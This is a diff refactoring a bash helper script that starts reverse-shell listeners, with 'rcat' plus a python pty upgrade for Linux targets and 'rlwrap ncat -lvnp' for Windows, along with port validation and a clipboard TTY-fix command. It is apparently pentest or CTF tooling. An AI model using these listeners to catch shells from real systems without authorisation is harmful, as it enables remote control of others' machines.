@@ -1,51 +1,109 @@
 #!/bin/bash
 
 RED="\e[31m"
-YELLOW=$'\e[33m'
+YELLOW="\e[33m"
+BLUE="\e[34m"
+GREEN="\e[32m"
 RESET="\e[0m"
 
-if [[ "$#" -ne 2 ]]; then
-    echo -e "${RED}[x]${RESET} Error: Incorrect number of arguments"
-
+usage() {
     echo -e "\nUsage:"
-    echo -e "\tlisten linux <port>"
-    echo -e "\tlisten windows <port>"
-    exit 1
-fi
+    echo -e "\t${0##*/} linux <port>"
+    echo -e "\t${0##*/} windows <port>"
+}
 
-if ! command -v rcat >/dev/null 2>&1; then
-    echo -e "${RED}[x]${RESET} rcat not installed"
-    exit 1
-fi
+validate_port() {
+    local port=$1
+    if ! [[ "$port" =~ ^[0-9]+$ ]] || ((port < 1)) || ((port > 65535)); then
+        echo -e "${RED}[x]${RESET} Invalid port number: $port" >&2
+        exit 1
+    fi
+}
 
-if [[ "$XDG_SESSION_TYPE" == "x11" ]] && ! command -v xclip >/dev/null 2>&1; then
-    echo -e "${RED}[x]${RESET} xclip not installed"
-    exit 1
-fi
+check_dependency() {
+    if ! command -v "$1" >/dev/null 2>&1; then
+        echo -e "${RED}[x]${RESET} Missing required dependency: $1" >&2
+        exit 1
+    fi
+}
 
-copy=""
-if uname -r | grep -q "microsoft"; then
-    copy='/mnt/c/Windows/System32/clip.exe'
-elif [[ "$XDG_SESSION_TYPE" == "x11" ]]; then
-    copy='xclip -selection clipboard'
-else
-    copy='wl-copy'
-fi
+get_clipboard_tool() {
+    if [[ -n "$WSL_DISTRO_NAME" ]]; then
+        echo "/mnt/c/Windows/System32/clip.exe"
+    elif [[ "$XDG_SESSION_TYPE" == "x11" ]]; then
+        echo "xclip -selection clipboard"
+    else
+        echo "wl-copy"
+    fi
+}
 
-if [[ "$1" == "linux" ]]; then
+generate_linux_fix_command() {
+    local rows cols
     read -r rows cols < <(stty size)
-    fix_command="export TERM=xterm-256color; stty rows $rows cols $cols; alias ls='ls --color=auto'; alias grep='grep --color=auto'; alias ip='ip --color=auto'"
-    echo -n "$fix_command" | $copy
-    echo -e "\n${YELLOW}[!]${RESET} Fix command copied to clipboard"
-    echo -e "\n${YELLOW}[!]${RESET} Fix command: $fix_command"
+    echo -n "export TERM=xterm-256color; stty rows $rows cols $cols; alias ls='ls --color=auto'; alias grep='grep --color=auto'; alias ip='ip --color=auto'"
+}
 
-    stty raw -echo
-    rcat listen -ie "/usr/bin/env python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" "$2"
-    reset
-elif [[ "$1" == "windows" ]]; then
-    echo -ne "\n"
-    rlwrap ncat -lvnp "$2"
-else
-    echo -e "\n${RED}[x]${RESET} Invalid option\n"
-    exit 1
-fi
+linux_listener() {
+    local port=$1
+    local copy_cmd=$2
+    local fix_command
+
+    fix_command=$(generate_linux_fix_command)
+
+    echo -n "$fix_command" | $copy_cmd
+    echo -e "\n${YELLOW}[!]${RESET} Fix command copied to clipboard"
+    echo -e "\n${GREEN}[+]${RESET} Listening for Linux reverse shell on port ${BLUE}${port}${RESET}..."
+
+    # Ensure terminal reset
+    (
+        stty raw -echo
+        trap 'reset' EXIT INT TERM
+
+        # Have to exit 2 times due to the bash instance spawned by python
+        rcat listen -ie "/usr/bin/env python3 -c 'import pty; pty.spawn(\"/bin/bash\")'" "$port"
+    )
+}
+
+windows_listener() {
+    local port=$1
+    echo -e "\n${GREEN}[+]${RESET} Listening for Windows reverse shell on port ${BLUE}${port}${RESET}..."
+    rlwrap ncat -lvnp "$port"
+}
+
+main() {
+    if [[ "$#" -ne 2 ]]; then
+        echo -e "${RED}[x]${RESET} Error: Incorrect number of arguments"
+        usage
+        exit 1
+    fi
+
+    target_os=$1
+    port=$2
+
+    validate_port "$port"
+
+    case "$target_os" in
+        linux)
+            check_dependency "rcat"
+            if [[ "$XDG_SESSION_TYPE" == "x11" ]]; then
+                check_dependency "xclip"
+            else
+                check_dependency "wl-copy"
+            fi
+            clipboard_tool=$(get_clipboard_tool)
+            linux_listener "$port" "$clipboard_tool"
+            ;;
+        windows)
+            check_dependency "rlwrap"
+            check_dependency "ncat"
+            windows_listener "$port"
+            ;;
+        *)
+            echo -e "${RED}[✘]${RESET} Invalid OS: $target_os" >&2
+            usage
+            exit 1
+            ;;
+    esac
+}
+
+main "$@"
